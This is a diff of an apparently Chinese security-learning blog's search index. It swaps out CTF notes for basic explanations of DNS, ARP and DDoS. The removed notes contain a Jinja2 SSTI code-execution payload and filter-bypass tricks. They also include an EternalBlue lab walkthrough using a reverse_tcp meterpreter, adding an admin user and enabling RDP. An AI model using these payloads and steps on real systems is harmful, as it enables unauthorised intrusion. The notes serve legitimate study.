 <tr>
-<td>-i</td>
-<td>删除已有文件或目录之前先询问用户</td>
+<td>顶级域名服务器</td>
+<td>负责管理在该顶级域名服务器下注册的二级域名</td>
 </tr>
 <tr>
-<td>-r</td>
-<td>递归处理， 将指定目录下的所有文件与子目录一并处理</td>
+<td>权限域名服务器</td>
+<td>负责一个区的域名解析工作</td>
 </tr>
 <tr>
-<td>/</td>
-<td>在Linux中表示根目录</td>
-</tr>
-<tr>
-<td>*</td>
-<td>所有文件</td>
-</tr>
-<tr>
-<td>/*</td>
-<td>根目录下的所有文件</td>
+<td>本地域名服务器</td>
+<td>当一个主机发出<code>DNS</code>查询请求时，这个查询请求首先发给本地域名服务器</td>
 </tr>
 </tbody></table>
-<p>而<code>mv</code>命令是用来移动文件或者将文件改名，备份文件或者目录。</p>
-<h2 id="Linux系统中的反引号"><a href="#Linux系统中的反引号" class="headerlink" title="Linux系统中的反引号"></a>Linux系统中的反引号</h2><p>在<code>linux</code>中反引号的作用就是将反引号内的<code>Linux</code>命令先执行，然后将执行结果赋予变量。<br> 比如<code> cat \</code>ls` <code>相当于将 </code>ls<code>出来的结果</code>cat`。</p>
-<h2 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a><code>jsfuck</code></h2><p><code>jsfuck</code>源于一门编程语言<code>brainfuck</code>，其主要的思想就是只使用8种特定的符号来编写代码。而<code>jsfuck</code>也是沿用了这个思想，它仅仅使用6种符号来编写代码。它们分别是(、)、+、[、]、!。(用6个字符输出任意<code>JavaScript</code>)</p>
-<h2 id="sha1碰撞"><a href="#sha1碰撞" class="headerlink" title="sha1碰撞"></a><code>sha1</code>碰撞</h2><p>这两个值<code>a</code>和<code>b</code>值不同但是<code>sha1</code>值相同</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure>
-
-<h2 id="127-0-0-1的各种进制，一般利用十进制绕过"><a href="#127-0-0-1的各种进制，一般利用十进制绕过" class="headerlink" title="127.0.0.1的各种进制，一般利用十进制绕过"></a><code>127.0.0.1</code>的各种进制，一般利用十进制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:</span><br><span class="line">八进制：0177.0.0.1</span><br><span class="line">十六进制：0x7f.0.0.1</span><br><span class="line">十进制：2130706433</span><br></pre></td></tr></table></figure>
-
-<h2 id="ssit官方漏洞利用"><a href="#ssit官方漏洞利用" class="headerlink" title="ssit官方漏洞利用"></a><code>ssit</code>官方漏洞利用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.<span class="keyword">__class__</span> == &#123;&#125;.<span class="keyword">__class__</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;         <span class="comment">//poppen的参数就是要执行的命令</span></span><br><span class="line">    &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux能打开文件的命令"><a href="#Linux能打开文件的命令" class="headerlink" title="Linux能打开文件的命令"></a><code>Linux</code>能打开文件的命令</h2><ul>
-<li><p><code>cat</code> 由第一行开始显示内容，并将所有内容输出</p>
-</li>
-<li><p><code>tac</code> 从最后一行倒序显示内容，并将所有内容输出</p>
-</li>
-<li><p><code>more</code> 根据窗口大小，一页一页的显示文件内容</p>
-</li>
-<li><p><code>less</code> 和<code>more</code>相似，但其优点可以往前翻页，并且进行可以搜索字符(使用<code>q</code>或者<code>ctrl</code>+<code>z</code>退出，<code>j</code>下一行,<code>k</code>上一行)</p>
-</li>
-<li><p><code>head</code> 只显示头几行</p>
-</li>
-<li><p><code>tail</code> 只显示最后几行</p>
-</li>
-<li><p><code>nl</code> 类似于cat -n，显示时输出行号</p>
-</li>
-<li><p><code>tailf</code> 类似于<code>tail -f</code></p>
-</li>
-<li><p><code>sed</code> 使用<code>sed -n &#39;p&#39; 1.txt</code>来打开文件，如果使用<code>sed &#39;p&#39; 1.txt</code>每一行会输出两次</p>
-</li>
-<li><p><code>sort</code> 将文件进行排序，并将排序结果标准输出</p>
-</li>
-<li><p><code>uniq</code> 用于报告会忽略文件中的重复行</p>
-</li>
-<li><p><code>rev</code> 将文件中的每行内容以字符为单位<strong>反序</strong>输出</p>
-</li>
-<li><p><code>cut</code> 使用<code>cut -c 1- 1.txt</code> 打卡文件 <code>1-</code>是用于指定起始位置和结束位置的，单写一个表示切割那个位置上的数并输出(从1开始)，这里的<code>1-</code>表示，从1开始到末尾</p>
-</li>
-<li><p><code>awk</code> 文本和数据进行处理的编程语言，使用<code>awk &#39;&#123;print&#125;&#39; 1.txt</code>打卡文件</p>
-</li>
-<li><p><code>stings</code> 在对象文件或二进制文件中查找可打印的字符串(可用于打卡<code>.c</code>后缀的文件)</p>
-</li>
-<li><p><code>od</code> 输出文件的八进制，十六进制等格式编码的字节，使用<code>od -c 1.txt</code>打开文件</p>
-</li>
-<li><p><code>paste</code> 用于将多个文件按照队列进行合并。可用于读取文件</p>
-</li>
-<li><p><code>diff</code> 比较给定两个文件的不同，可用于读取数据<code>diff 1.txt 2.txt</code></p>
-</li>
-<li><p><code>curl</code> 使用<code>file:///xxx/xxx.txt</code>可读取文件</p>
-</li>
-<li><p><code>bzmore</code> 查看<code>bzip2</code>压缩过的文本文件的内容</p>
-</li>
-<li><p><code>bzless</code> 是增强<code>.bz2</code>压缩包查看器，<code>bzless</code>比<code>bzmore</code>命令功能更强大</p>
-</li>
+<h3 id="DNS查询有中两种查询方式"><a href="#DNS查询有中两种查询方式" class="headerlink" title="DNS查询有中两种查询方式"></a>DNS查询有中两种查询方式</h3><ul>
+<li>递归查询：本机向本地域名服务器发出一次查询请求，就静待最终的结果。如果本地域名服务器无法解析，自己会以<code>DNS</code>客户机的身份向其它域名服务器查询，直到得到最终的<code>IP</code>地址告诉本机。</li>
+<li>迭代查询：本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。</li>
 </ul>
-<h2 id="两个-和三个-的区别"><a href="#两个-和三个-的区别" class="headerlink" title="两个==和三个===的区别"></a>两个<code>==</code>和三个<code>===</code>的区别</h2><ul>
-<li><p><code>==</code> 两边值类型不同的时候，要先进行类型转换，再比较。</p>
-<p>所以在<code>==</code>双等号的比较中以<code>0e</code>开头的都会转化成科学计数法。而科学计数法中<code>0</code>乘任何数都是0。</p>
-</li>
-<li><p><code>===</code> 不做类型转换，类型不同的一定不等。</p>
-</li>
+<p>通俗地说，<strong>递归</strong>就是把一件事情交给别人，如果事情没有办完，哪怕已经办了很多，都不要把结果告诉我，我要的是你的最终结果，而不是中间结果。如果你没办完，请你找别人办完。<br><strong>迭代</strong>则是我交给你一件事，你能办多少就告诉我你办了多少，然后剩下的事情就由我来办。</p>
+<h2 id="ARP协议简介"><a href="#ARP协议简介" class="headerlink" title="ARP协议简介"></a>ARP协议简介</h2><h3 id="ARP协议的定义"><a href="#ARP协议的定义" class="headerlink" title="ARP协议的定义"></a><code>ARP</code>协议的定义</h3><p>地址解析协议(<code>Address Resolution Protoco</code>)，其基本功能为<strong>透过目标设备<code>IP</code>地址，查询目标设备的<code>MAC</code>地址</strong>，以保证通信的顺利进行。它是<code>IPv4</code>网络层必不可少的协议，不过在<code>IPv6</code>中已不再适用，并被邻居发现协议<code>NDP</code>替代。</p>
+<h3 id="ARP协议的缺陷"><a href="#ARP协议的缺陷" class="headerlink" title="ARP协议的缺陷"></a><code>ARP</code>协议的缺陷</h3><ul>
+<li><code>ARP</code>请求与应答不需要配对(虚假<code>ARP</code>应答)。</li>
+<li><code>ARP</code> <code>reply</code>也可以广播</li>
+<li>以太帧的源<code>MAC</code>和<code>ARP</code>包里的发起端<code>MAC</code>可以不同(<code>ARP</code>依靠的是<code>ARP</code>包里的发起端<code>MAC</code>)。</li>
+<li>以太帧的源<code>MAC</code>可以是任意的(无法查找发起<code>ARP</code>欺骗的主机<code>MAC</code>)。</li>
 </ul>
 ]]></content>
   </entry>
   <entry>
-    <title>管道符</title>
-    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/%E7%AE%A1%E9%81%93%E7%AC%A6/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h3 id="系统支持的管道符如下-Linux和windows一样-："><a href="#系统支持的管道符如下-Linux和windows一样-：" class="headerlink" title="系统支持的管道符如下(Linux和windows一样)："></a>系统支持的管道符如下(Linux和windows一样)：</h3><ol>
-<li><code>;</code>：执行完前面的语句再执行后面的语句。</li>
-<li><code>|</code>：显示后面语句的执行结果。</li>
-<li><code>||</code>：当前面的语句执行出错时，执行后面的语句。</li>
-<li><code>&amp;</code>：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li>
-<li><code>&amp;&amp;</code>：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
-</ol>
-<p>如果禁用了<code>;</code>，<code>|</code>，<code>&amp;</code>可以使用换行符的<code>url</code>编码(<code>%0a</code>)来绕过(相当于直接执行下一题命令)。</p>
-<p>禁用空格(<code>%20</code>)可以使用制表符(<code>tab</code>)的<code>url</code>编码<code>%09</code>来绕过。</p>
-<p>禁用了<code>/</code>可以先用<code>cd</code>进入文件。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>MS17-010永恒之蓝的复现</title>
-    <url>/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
-    <content><![CDATA[<p>永恒之蓝是指2017年4月14日晚，黑客团体<code>Shadow Brokers</code>（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的<code>SMB</code>漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了<code>wannacry</code>勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
-<span id="more"></span>
-
-<h1 id="MS17-010永恒之蓝-复现"><a href="#MS17-010永恒之蓝-复现" class="headerlink" title="MS17-010永恒之蓝 复现"></a>MS17-010永恒之蓝 复现</h1><h2 id="使用设备"><a href="#使用设备" class="headerlink" title="使用设备"></a>使用设备</h2><p><code>kali</code>攻击机(<code>ip</code>:192.168.3.28)，<code>windows7</code>受害机(<code>ip</code>:192.168.3.105)</p>
-<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>用<code>nmap</code>扫一下端口:<code>nmap -sV 192.168.3.105</code></p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119141021754.png" class="" title="image-20211119141021754">
-
-<p>发现445端口开放的。</p>
-<p>然后漏洞脚本检测(有点慢，按回车可以看到进度):<code>nmap --script=vuln 192.168.3.105</code></p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119141845637.png" class="" title="image-20211119141845637">
-
-<p>发现可以利用<code>MS17-010</code>漏洞</p>
-<p>开启<code>msf</code>:<code>msfconsole</code></p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119142051646.png" class="" title="image-20211119142051646">
-
-<p>查找合适的<code>MS17-010</code>模块，输入<code>search ms17-010</code></p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119142232878.png" class="" title="image-20211119142232878">
-
-<p>选用命令执行漏洞的模块<code>use 0</code></p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119143655730.png" class="" title="image-20211119143655730">
-
-<p>设置<code>rhost</code>(攻击者的<code>ip</code>)，<code>rhost</code>(受害者的<code>ip</code>)，查看攻击设置(<code>show options</code>)</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119143821733.png" class="" title="image-20211119143821733">
-
-<p>设置木马(可查看有那些木马)</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119143953170.png" class="" title="image-20211119143953170">
-
-<p>我们选用方向连接木马</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119144239521.png" class="" title="image-20211119144239521">
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-
-<p>如果报错可以<code>show options</code>一下(因为我之前做过一次，所以报错了，在<code>options</code>里面可以看到<code>payload</code>已经配置的是这个了)</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119144744642.png" class="" title="image-20211119144744642">
-
-<p>输入<code>exploit</code>就可以攻击了</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119145334936.png" class="" title="image-20211119145334936">
-
-<p>这里发送了一点小问题，攻击失败了，因为<code>windows</code>这边开启了: 限制对命名管道和共享的匿名访问，我们把他关掉</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119145636384.png" class="" title="image-20211119145636384">
-
-<p>然后输入<code>exit</code>退出，再攻击</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119150019797.png" class="" title="image-20211119150019797">
-
-<p>这种情况就是攻击成功了</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119150817893.png" class="" title="image-20211119150817893">
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>输入<code>shell</code>进入命令执行</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119151010674.png" class="" title="image-20211119151010674">
-
-<p>执行一下简单的命令</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119151415147.png" class="" title="image-20211119151415147">
-
-<p>能写入文件(<code>windows</code>下打开文件是<code>type</code>)</p>
-<p>接下来可以提权，先新建一个用户</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user two admin123 /add</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119151629903.png" class="" title="image-20211119151629903">
-
-<p>提升为管理员权限</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119152119745.png" class="" title="image-20211119152119745">
-
-<p>我们在<code>windows</code>这边来验证一下</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119152620064.png" class="" title="image-20211119152620064">
-
-<p>这里可以看出<code>two</code>的权限提升到<code>Administrators</code>，而<code>one</code>没有(<code>one</code>是为了验证重新按照<code>two</code>创建的方式创建的，但是没有提权)</p>
-<p>有管理员用户了，然后我们可以开启3389端口(如果没开启的话)，进行远程连接操作。</p>
-<p>开启3389 :</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
-
-<p>关闭3389 :</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>
-
-<p>查看当前的端口<code>netstat -ano</code></p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119152940850.png" class="" title="image-20211119152940850">
-
-<p>发现并没有3389端口，我们尝试使用命令将他打开</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119153141906.png" class="" title="image-20211119153141906">
-
-<p>进行远程连接，<code>Win+R:mstsc</code></p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119153324367.png" class="" title="image-20211119153324367">
-
-<p>输入<code>ip</code>、用户名和密码</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119153419851.png" class="" title="image-20211119153419851">
-
-<p>我这里虚拟机出了点问题，重启了虚拟机，<code>ip</code>变了但是不影响，重新操作一下就行了。</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119154329606.png" class="" title="image-20211119154329606">
-
-<p>因为<code>windows7</code>虚拟机挂着的，我这边登录就会挤掉另一边。</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119154435490.png" class="" title="image-20211119154435490">
-
-<p>确定就行，然后就成功连接了</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119154553452.png" class="" title="image-20211119154553452">
-
-<p>除了远程连接也可以，上传木马程序，这里上传两个文件。</p>
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119195658082.png" class="" title="image-20211119195658082">
-
-<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119195716745.png" class="" title="image-20211119195716745">
-
-
-
-<p>参考文章:</p>
-<p><a href="https://blog.csdn.net/G_Fu_Q/article/details/109548277">https://blog.csdn.net/G_Fu_Q/article/details/109548277</a></p>
-<p><a href="https://www.jianshu.com/p/1adbabecdcbd">https://www.jianshu.com/p/1adbabecdcbd</a></p>
+    <title>网络协议概述</title>
+    <url>/2022/03/12/%E6%9D%82%E9%A1%B9/tw0/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/</url>
+    <content><![CDATA[<h2 id="为什么要学习网络协议"><a href="#为什么要学习网络协议" class="headerlink" title="为什么要学习网络协议"></a>为什么要学习网络协议</h2><h3 id="DDoS攻击介绍"><a href="#DDoS攻击介绍" class="headerlink" title="DDoS攻击介绍"></a>DDoS攻击介绍</h3><p><code>DDoS</code>攻击: 分布式拒绝服务攻击(<code>Distributed Denial of Service</code>)指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动<code>DDoS</code>攻击，从而成倍地提高拒绝服务攻击的威力。</p>
+<h3 id="ARP攻击介绍"><a href="#ARP攻击介绍" class="headerlink" title="ARP攻击介绍"></a>ARP攻击介绍</h3><p><code>ARP</code>协议: 通过目标设备的<code>IP</code>地址，查询目标设备的<code>MAC</code>地址，以保证通信的进行。</p>
+<p><code>ARP</code>攻击: 就是通过伪造<code>IP</code>地址和<code>MAC</code>地址实现<code>ARP</code>欺骗，能够在网络中产生大量的<code>ARP</code>通信量使网络阻塞，攻击者只要持续不断的发出伪造的<code>ARP</code>响应包就能更改目标主机<code>ARP</code>缓存中的<code>IP-MAC</code>条目，造成网络中断或中间人攻击。</p>
+<p><strong><code>ARP</code>攻击仅能在以太网(局域网如: 机房、内网、公司网络等)进行，无法对外网(互联网、非本域内的局域网)进行攻击。</strong></p>
+<p><code>ARP</code>攻击造成的影响:</p>
+<ul>
+<li>断网</li>
+<li>病毒传播</li>
+<li>数据泄露</li>
+</ul>
+<h3 id="DNS劫持介绍"><a href="#DNS劫持介绍" class="headerlink" title="DNS劫持介绍"></a>DNS劫持介绍</h3><p><code>DNS</code>劫持: 又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的<code>IP</code>地址或者什么都不做使请求失去响应，<strong>其效果就是对特定的网络不能访问或访问的是假网址</strong>。</p>
+<p>常见的攻击方式:</p>
+<ul>
+<li>利用<code>DNS</code>服务器进行<code>DDoS</code>攻击。</li>
+<li><code>DNS</code>缓存感染。</li>
+<li><code>DNS</code>信息劫持。</li>
+<li><code>DNS</code>重定向。</li>
+<li><code>ARP</code>欺骗。</li>
+<li>本机劫持。</li>
+</ul>
+<p>攻击造成的影响:</p>
+<ul>
+<li>网站无法访问。</li>
+<li>跳转到其他地址。</li>
+<li>钓鱼、欺骗。</li>
+<li>网站内出现恶意广告。</li>
+</ul>
+<h2 id="什么是网络通讯协议"><a href="#什么是网络通讯协议" class="headerlink" title="什么是网络通讯协议"></a>什么是网络通讯协议</h2><h3 id="网络通讯协议概述"><a href="#网络通讯协议概述" class="headerlink" title="网络通讯协议概述"></a>网络通讯协议概述</h3><p>什么是网络通讯协议: 网络协议为计算机网络中进行数据交换而建立的规则、标准或约定的集合。</p>
+<p>为什么需要网络通讯协议: 统一。</p>
+<p>常见的网络通讯协议:</p>
+<ul>
+<li><code>TCP</code>/<code>IP</code>协议</li>
+<li><code>NetBEUI</code>协议</li>
+<li><code>IPX/SPX</code>协议</li>
+</ul>
+<h3 id="网络协议的组成及分层"><a href="#网络协议的组成及分层" class="headerlink" title="网络协议的组成及分层"></a>网络协议的组成及分层</h3><p>网络协议组成的三要素:</p>
+<ul>
+<li>语法:包括数据格式、数据编码以及信号等。</li>
+<li>语义:包括用于协调和差错处理的控制信息。</li>
+<li>定时:包括传输速率和数据排序。</li>
+</ul>
+<p>网络协议分层:</p>
+<p>(<code>OSI</code>七层参考模型，从上至下)</p>
+<ul>
+<li>应用层: 访问网络服务的接口，对应用程序的通信服务。</li>
+<li>表述层: 提供数据格式转换服务。</li>
